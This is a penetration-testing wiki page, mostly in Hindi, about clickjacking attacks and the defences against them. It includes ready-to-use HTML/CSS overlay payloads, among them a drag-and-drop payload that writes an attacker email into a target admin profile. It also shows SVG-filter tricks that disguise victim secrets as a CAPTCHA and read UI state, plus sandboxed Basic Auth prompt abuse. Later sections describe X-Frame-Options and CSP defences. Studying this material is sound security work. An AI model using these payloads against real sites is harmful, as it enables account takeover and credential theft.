# Clickjacking

{{#include ../banners/hacktricks-training.md}}

## Clickjacking क्या है

Clickjacking हमले में, एक **user** को धोखा देकर एक वेबपेज पर किसी ऐसे **element** पर **clicking** करने के लिए मजबूर किया जाता है जो या तो **invisible** होता है या किसी अलग element के रूप में छिपा होता है। यह चालबाज़ी user के लिए अनचाहे परिणामों का कारण बन सकती है, जैसे कि malware का डाउनलोड, दुर्भावनापूर्ण वेब पेजों पर redirection, credentials या संवेदनशील जानकारी का प्रदान करना, पैसे का transfer, या ऑनलाइन उत्पादों की खरीदारी।

### Prepopulate forms trick

कभी-कभी यह संभव होता है कि **पेज लोड करते समय GET parameters का उपयोग करके किसी form के फील्ड के मान को भर दिया जाए**। एक attacker इस व्यवहार का दुरुपयोग करके किसी form को मनमानी data से भरकर clickjacking payload भेज सकता है ताकि user Submit बटन दबा दे।

### Drag\&Drop के साथ form भरना

यदि आपको user से **form भरवाना** है लेकिन आप सीधे उससे कोई विशिष्ट जानकारी (जैसे वह email और/या specific password जिसे आप जानते हैं) लिखने के लिए कहना नहीं चाहते, तो आप बस उससे कुछ **Drag\&Drop** करने को कह सकते हैं जो आपकी नियंत्रित data लिख देगा, जैसा कि [**this example**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/) में है।

### Basic Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### बहु-चरण Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Click payload
```css
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

यदि आपने पहचाना है कि **XSS attack जो user को click करने की आवश्यकता रखता है** ताकि XSS **trigger** हो और पेज **vulnerable to Clickjacking** है, तो आप इसे abuse करके user को button/link पर क्लिक करने के लिए trick कर सकते हैं.\
Example:\
आपने account के कुछ private विवरणों में एक **self XSS** पाया है (ऐसे विवरण जिन्हें **केवल आप ही सेट और पढ़ सकते हैं**). उन विवरणों को सेट करने वाला पेज जिसमें **form** है, **vulnerable** to **Clickjacking** है और आप GET parameters से उस **form** को **prepopulate** कर सकते हैं.\
एक attacker उस पेज पर **Clickjacking** हमला तैयार कर सकता है, जिसमें वह **XSS payload** के साथ **form** को **prepopulate** करे और **user** को form **Submit** करने के लिए trick करे. तो, **when the form is submitted** और values modify हो जाने पर, **user XSS execute कर देगा**.


### DoubleClickjacking

Firstly [explained in this post](https://securityaffairs.com/172572/hacking/doubleclickjacking-clickjacking-on-major-websites.html), यह technique पीड़ित से एक custom पेज के किसी button पर double click करने को कहती है जो एक specific स्थान पर रखा गया हो, और mousedown और onclick events के बीच timing differences का उपयोग करके double click के दौरान victim page को load कर देती है ताकि **victim actually clicks a legit button in the victim page**.

An example could be seen in this video: [https://www.youtube.com/watch?v=4rGvRRMrD18](https://www.youtube.com/watch?v=4rGvRRMrD18)

A code example can be found in [this page](https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html).

> [!WARNING]
> यह technique user को victim page के एक ही स्थान पर क्लिक करने के लिए trick करने की अनुमति देती है और clickjacking के खिलाफ सभी protections को bypass कर सकती है. इसलिए attacker को ऐसे **sensitive actions जो सिर्फ 1 click में किए जा सकें, जैसे OAuth prompts में permissions accept करना** ढूँढने होंगे.

### SVG Filters / Cross-Origin Iframe UI Redressing

Modern Chromium/WebKit/Gecko builds allow CSS `filter:url(#id)` to be applied to cross-origin iframes. iframe के rasterized pixels SVG filter graph में `SourceGraphic` के रूप में expose होते हैं, इसलिए primitives जैसे `feDisplacementMap`, `feBlend`, `feComposite`, `feColorMatrix`, `feTile`, `feMorphology`, आदि attacker के DOM को touch किए बिना victim UI को user के देखने से पहले arbitrary रूप से warp कर सकते हैं. एक साधारण Liquid-Glass style filter इस प्रकार दिखता है:
```html
<iframe src="https://victim.example" style="filter:url(#displacementFilter4)"></iframe>
```
* उपयोगी प्रिमिटिव्स: `feImage` attacker bitmaps लोड करता है (e.g., overlays, displacement maps); `feFlood` स्थिर-रंग के मैट्स बनाता है; `feOffset/feGaussianBlur` हाइलाइट्स को परिष्कृत करते हैं; `feDisplacementMap` टेक्स्ट को विरूपित/वक्र करता है; `feComposite operator="arithmetic"` arbitrary per-channel गणित लागू करता है (`r = k1*i1*i2 + k2*i1 + k3*i2 + k4`), जो कॉन्ट्रास्ट बूस्टिंग, मास्किंग, और AND/OR ऑपरेशनों के लिए पर्याप्त है; `feTile` pixel probes को crop और replicate करता है; `feMorphology` strokes को बढ़ाता/छोटा करता है; `feColorMatrix` luma को alpha में स्थानांतरित करके सटीक मास्क बनाता है।

#### रहस्यों को CAPTCHA-शैली के प्रॉम्प्ट में विकृत करना

यदि कोई framable endpoint रहस्य (tokens, reset codes, API keys) रेंडर करता है, तो हमलावर उन्हें इस तरह विकृत कर सकता है कि वे CAPTCHA जैसा दिखें और मैन्युअल ट्रांसक्रिप्शन के लिए मजबूर कर सकें:
```html
<svg width="0" height="0">
<filter id="captchaFilter">
<feTurbulence type="turbulence" baseFrequency="0.03" numOctaves="4" result="noise" />
<feDisplacementMap in="SourceGraphic" in2="noise" scale="6" xChannelSelector="R" yChannelSelector="G" />
</filter>
</svg>
<iframe src="https://victim" style="filter:url(#captchaFilter)"></iframe>
<input pattern="^6c79 ?7261 ?706f ?6e79$" required>
```
The distorted pixels fool the user into “solving” the captcha inside the attacker-controlled `<input>` whose `pattern` enforces the real victim secret.

#### पीड़ित इनपुट का पुनःसंदर्भ

Filters प्लेसहोल्डर/validation टेक्स्ट को सर्जिकल तरीके से हटा सकते हैं जबकि user की कीस्ट्रोक्स बरकरार रखी जाती हैं। एक वर्कफ़्लो:

1. `feComposite operator="arithmetic" k2≈4` ब्राइटनेस को amplify करता है ताकि grey helper text सफेद में saturate हो जाए।
2. `feTile` input के आयत क्षेत्र तक काम करने वाला एरिया सीमित करता है।
3. `feMorphology operator="erode"` पीड़ित द्वारा टाइप किए गए dark glyphs को मोटा करता है और उन्हें `result="thick"` के जरिए स्टोर करता है।
4. `feFlood` एक white plate बनाता है, `feBlend mode="difference"` को `thick` के साथ मिलाता है, और दूसरा `feComposite k2≈100` इसे एक तीखे luma matte में बदल देता है।
5. `feColorMatrix` उस luma को alpha में ले जाता है, और `feComposite in="SourceGraphic" operator="in"` केवल user-entered glyphs को रखता है।
6. एक और `feBlend in2="white"` और एक पतला crop एक साफ textbox देता है, जिसके बाद attacker अपने HTML लेबल ओवरले कर देता है (उदा., “अपना ईमेल दर्ज करें”) जबकि hidden iframe अभी भी पीड़ित origin की पासवर्ड नीति को enforce करता है।

Safari को `feTile` में दिक्कत होती है; वही प्रभाव WebKit-only payloads के लिए `feFlood` + `feColorMatrix` + `feComposite` से बने spatial mattes के साथ reproduce किया जा सकता है।

#### पिक्सल प्रोब, लॉजिक और स्टेट मशीनें

`feTile` के साथ 2–4 px के क्षेत्र को crop करके और उसे viewport के `100%` पर टाइल करके, attacker sampled रंग को एक full-frame texture में बदल देता है जिसे threshold करके एक boolean mask बनाया जा सकता है:
```html
<filter id="pixelProbe">
<feTile x="313" y="141" width="4" height="4" />
<feTile x="0" y="0" width="100%" height="100%" result="probe" />
<feComposite in="probe" operator="arithmetic" k2="120" k4="-1" />
<feColorMatrix type="matrix" values="0 0 0 0 0  0 0 0 0 0  0 0 0 0 0  0 0 1 0 0" result="mask" />
<feGaussianBlur in="SourceGraphic" stdDeviation="2" />
<feComposite operator="in" in2="mask" />
<feBlend in2="SourceGraphic" />
</filter>
```
For arbitrary colors, a `feFlood` reference (e.g., `#0B57D0`) plus `feBlend mode="difference"` and another arithmetic composite (`k2≈100`, `k4` as tolerance) outputs white only when the sampled pixel matches the target shade. Feeding these masks into `feComposite` with tuned `k1..k4` yields logic gates: `AND` via `k1=1`, `OR` via `k2=k3=1`, `XOR` via `feBlend mode="difference"`, `NOT` via blending against white. Chaining gates makes a full adder inside the filter graph, proving the pipeline is functionally complete.

इसलिए हमलावर JavaScript के बिना UI state पढ़ सकते हैं। modal workflow के उदाहरण boolean:

- **D** (dialog visible): एक अँधेरे कोने को जांचें और इसे सफेद के साथ परखें।
- **L** (dialog loaded): उस निर्देशांक का परीक्षण करें जहाँ बटन ready होने पर दिखाई देता है।
- **C** (checkbox checked): चेकबॉक्स पिक्सल की तुलना active blue `#0B57D0` से करें।
- **R** (red success/failure banner): बैनर आयत के अंदर `feMorphology` और लाल थ्रेशोल्ड का उपयोग करें।

प्रत्येक detected state एक अलग overlay bitmap को gate करता है जो `feImage xlink:href="data:..."` के माध्यम से embedded होता है। इन bitmaps को `D`, `L`, `C`, `R` के साथ mask करने से overlays असली डायलॉग के साथ synchronized रहते हैं और victim को multi-step workflows (पासवर्ड रीसेट्स, अनुमोदन, विनाशकारी पुष्टि) के माध्यम से ले जाते हैं बिना कभी DOM को उजागर किए।

### Sandboxed iframe Basic Auth dialog (no allow-popups)

एक sandboxed iframe जिसमें `allow-popups` नहीं है, तब भी ब्राउज़र-नियंत्रित **HTTP Basic Authentication modal** दिखा सकता है जब किसी लोड का response `401` हो और उसमें `WWW-Authenticate` header हो। यह dialog ब्राउज़र के networking/auth layer द्वारा उत्पन्न होता है (JS के `alert/prompt/confirm` द्वारा नहीं), इसलिए sandbox की popup सीमाएँ इसे दबाती नहीं हैं। अगर आप iframe को स्क्रिप्ट कर सकते हैं (उदा., `sandbox="allow-scripts"`), तो आप इसे किसी भी endpoint पर navigate कर सकते हैं जो Basic Auth challenge जारी करता हो:
```html
<iframe id="basic" sandbox="allow-scripts"></iframe>
<script>
basic.src = "https://httpbin.org/basic-auth/user/pass"
</script>
```
Once the response arrives, the browser prompts for credentials even though popups are disallowed. Framing a trusted origin with this trick enables UI redress/phishing: unexpected modal prompts inside a "sandboxed" widget can confuse users or trigger password managers to offer stored credentials.

### Browser extensions: DOM-based autofill clickjacking

Aside from iframing victim pages, attackers can target browser extension UI elements that are injected into the page. Password managers render autofill dropdowns near focused inputs; by focusing an attacker-controlled field and hiding/occluding the extension’s dropdown (opacity/overlay/top-layer tricks), a coerced user click can select a stored item and fill sensitive data into attacker-controlled inputs. This variant requires no iframe exposure and works entirely via DOM/CSS manipulation.

- For concrete techniques and PoCs see:
{{#ref}}
browser-extension-pentesting-methodology/browext-clickjacking.md
{{#endref}}

## Clickjacking को कम करने की रणनीतियाँ

### Client-Side Defenses

क्लाइंट-साइड पर चलने वाले scripts Clickjacking को रोकने के लिए कार्रवाई कर सकते हैं:

- यह सुनिश्चित करना कि application window मुख्य या top window हो।
- सभी frames को visible बनाना।
- अदृश्य frames पर clicks को रोकना।
- संभावित Clickjacking प्रयासों का पता लगाना और उपयोगकर्ताओं को चेतावनी देना।

हालाँकि, ये frame-busting scripts बायपास किये जा सकते हैं:

- **Browsers' Security Settings:** कुछ browsers अपने security settings या JavaScript support की कमी के आधार पर इन scripts को block कर सकते हैं।
- **HTML5 iframe `sandbox` Attribute:** एक attacker frame buster scripts को neutralize कर सकता है by setting the `sandbox` attribute with `allow-forms` or `allow-scripts` values without `allow-top-navigation`. This prevents the iframe from verifying if it is the top window, e.g.,
```html
<iframe
id="victim_website"
src="https://victim-website.com"
sandbox="allow-forms allow-scripts"></iframe>
```
The `allow-forms` and `allow-scripts` values enable actions within the iframe while disabling top-level navigation. To ensure the intended functionality of the targeted site, additional permissions like `allow-same-origin` and `allow-modals` might be necessary, depending on the attack type. Browser console messages can guide which permissions to allow.

### सर्वर-साइड रक्षा

#### X-Frame-Options

The **`X-Frame-Options` HTTP response header** informs browsers about the legitimacy of rendering a page in a `<frame>` or `<iframe>`, helping to prevent Clickjacking:

- `X-Frame-Options: deny` - No domain can frame the content.
- `X-Frame-Options: sameorigin` - Only the current site can frame the content.
- `X-Frame-Options: allow-from https://trusted.com` - Only the specified 'uri' can frame the page.
- Note the limitations: if the browser doesn't support this directive, it might not work. Some browsers prefer the CSP frame-ancestors directive.

#### Content Security Policy (CSP) frame-ancestors directive

**`frame-ancestors` directive in CSP** is the advised method for Clickjacking protection:

- `frame-ancestors 'none'` - Similar to `X-Frame-Options: deny`.
- `frame-ancestors 'self'` - Similar to `X-Frame-Options: sameorigin`.
- `frame-ancestors trusted.com` - Similar to `X-Frame-Options: allow-from`.

For instance, the following CSP only allows framing from the same domain:

`Content-Security-Policy: frame-ancestors 'self';`

Further details and complex examples can be found in the [frame-ancestors CSP documentation](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) and [Mozilla's CSP frame-ancestors documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Content Security Policy (CSP) with `child-src` and `frame-src`

**Content Security Policy (CSP)** is a security measure that helps in preventing Clickjacking and other code injection attacks by specifying which sources the browser should allow to load content.

#### `frame-src` Directive

- Defines valid sources for frames.
- More specific than the `default-src` directive.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
यह नीति समान origin (self) और https://trusted-website.com से frames की अनुमति देती है।

#### `child-src` निर्देश

- CSP level 2 में web workers और frames के लिए मान्य स्रोत सेट करने हेतु पेश किया गया।
- frame-src और worker-src के लिए fallback के रूप में कार्य करता है।
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
यह नीति उसी origin (self) और https://trusted-website.com से frames और workers की अनुमति देती है।

**उपयोग नोट्स:**

- डिप्रिकेशन: child-src को धीरे-धीरे frame-src और worker-src के पक्ष में हटाया जा रहा है।
- Fallback Behavior: यदि frame-src अनुपस्थित है, तो frames के लिए fallback के रूप में child-src का उपयोग किया जाता है। यदि दोनों अनुपस्थित हैं, तो default-src का उपयोग किया जाता है।
- Strict Source Definition: directives में केवल trusted sources शामिल करें ताकि exploitation रोका जा सके।

#### JavaScript Frame-Breaking Scripts

हालाँकि यह पूरी तरह भरोसेमंद नहीं है, JavaScript-based frame-busting scripts का उपयोग किसी वेब पेज को फ्रेम किए जाने से रोकने के लिए किया जा सकता है। उदाहरण:
```javascript
if (top !== self) {
top.location = self.location
}
```
#### Anti-CSRF Tokens का उपयोग

- **Token Validation:** वेब एप्लिकेशनों में anti-CSRF tokens का उपयोग करें ताकि state-changing requests उपयोगकर्ता की मंशा से ही किए जाएँ और किसी Clickjacked page के माध्यम से न हों।

## संदर्भ

- [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
- [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)
- [SVG Filters - Clickjacking 2.0](https://lyra.horse/blog/2025/12/svg-clickjacking/)
- [Iframe sandbox Basic Auth modal](https://phor3nsic.github.io/2026/01/21/trick-iframe-sandbox.html)
- [Chromestatus: Restrict sandboxed frame dialogs](https://chromestatus.com/feature/4747009953103872)
- [Chromium issue about sandboxed auth dialogs](https://issues.chromium.org/issues/40266321)

{{#include ../banners/hacktricks-training.md}}
